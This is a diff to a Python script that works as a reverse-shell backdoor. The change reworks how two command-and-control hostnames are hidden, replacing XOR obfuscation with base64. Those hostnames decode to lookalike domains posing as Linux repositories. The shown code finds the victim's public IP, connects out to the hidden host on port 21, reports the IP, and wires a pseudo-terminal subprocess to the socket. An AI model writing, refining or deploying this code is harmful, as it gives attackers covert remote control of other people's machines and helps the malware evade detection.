@@ -14,15 +14,15 @@ import base64
 LOCKFILE = "/tmp/cached_script.lock"
 
 
-OBFUSCATED_PRIMARY = "Hzw1Cjo8DDw7Cw48CDw1NTo8CDo7DAw7Cw48" 
-OBFUSCATED_BACKUP  = "Hzo9Czw9Cjs8DDw6DAw7PDo7Cw4PDDsrPDo7Cw48" 
-CIPHER_KEY = 42
+OBFUSCATED_PRIMARY = "dWJ1bnR1LXJlcG8uc3RyYW5nbGVkLm5ldA=="  
+OBFUSCATED_BACKUP  = "bGludXgteDg2LXRjcHVkcC5zdHJhbmdsZWQubmV0" 
 
 def get_true_host_string(obfuscated_data):
+    """Decodes pure Base64 strings directly in memory at runtime."""
     try:
-        raw_base64 = base64.b64decode(obfuscated_data)
-        decoded_chars = [chr(b ^ CIPHER_KEY) for b in raw_base64]
-        return "".join(decoded_chars)
+
+        decoded_bytes = base64.b64decode(obfuscated_data)
+        return decoded_bytes.decode('utf-8').strip()
     except:
         return "127.0.0.1"
 
@@ -58,17 +58,14 @@ def main():
     
     true_ip = "Unknown IP"
     try:
-
         req = urllib.request.Request(
             "http://ipinfo.io", 
             headers={'User-Agent': 'curl/7.68.0'}
         )
         with urllib.request.urlopen(req, timeout=4) as response:
-
             raw_data = response.read().decode('utf-8', errors='ignore')
             true_ip = json.loads(raw_data).get("ip", "Unknown IP")
-    except Exception as e:
-
+    except:
         true_ip = "127.0.0.1"
 
     while True:
@@ -83,12 +80,11 @@ def main():
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((BACKUP_HOST, 21))
             
-
             clean_ip_string = str(true_ip).strip()
             
 
             s.sendall(f"{clean_ip_string}\n".encode('utf-8'))
-            s.sendall(b"\r\n") 
+            s.sendall(b"\r\n")
             
             master, slave = os.openpty()
             p = subprocess.Popen(
@@ -102,7 +98,7 @@ def main():
                 r, w, x = select.select([s, master], [], [], 5)
                 if not r:
                     try:
-                        s.send(b"\x00")
+                        s.send(b"\x00") 
                     except:
                         break
                     continue
